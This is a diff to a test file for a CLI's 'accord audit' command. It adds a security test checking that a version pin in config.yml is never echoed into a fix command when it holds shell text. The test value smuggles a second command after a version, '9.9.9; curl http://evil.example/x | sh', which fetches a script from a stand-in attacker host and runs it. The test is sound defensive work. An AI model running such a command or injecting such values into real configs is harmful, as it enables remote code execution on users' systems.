@@ -84,6 +84,20 @@ it('risk:parsing accord audit reports the pin when config.yml sets a key this CL
   expect(odd.lines.some((l) => l.startsWith('gap: config-invalid:')), odd.out).toBe(true);
 });
 
+it('risk:security accord audit never prints a pin that is not a version into a fix command (U-1)', async () => {
+  const hostile = '9.9.9; curl http://evil.example/x | sh';
+  // a config this CLI's schema refuses (a future key) whose pin is shell text: the raw-text read must not carry it into any line
+  const repo = committed({}, CONFIG.replace(/accord: "[^"]*"/, `accord: "${hostile}"`) + 'future_key: x\n');
+  const r = await audit(repo);
+  expect(r.code, r.out).toBe(0);
+  expect(r.out).not.toContain('evil.example');
+  expect(r.out).not.toContain('curl');
+  expect(r.lines.some((l) => l.startsWith('gap: config-invalid:')), r.out).toBe(true);
+  // a plain version in the same place is still read and named
+  const plain = await audit(committed({}, pinned(raised('minor')) + 'future_key: x\n'));
+  expect(plain.lines.find((l) => l.startsWith('gap: config-invalid:')), plain.out).toContain(raised('minor'));
+});
+
 // ---- group 2: accord's own setup (D-08) ----
 
 /** A committed repository `accord init` wrote (config, workflow, skills, agents, hooks, panel), plus `extra` appended to its config.yml. */
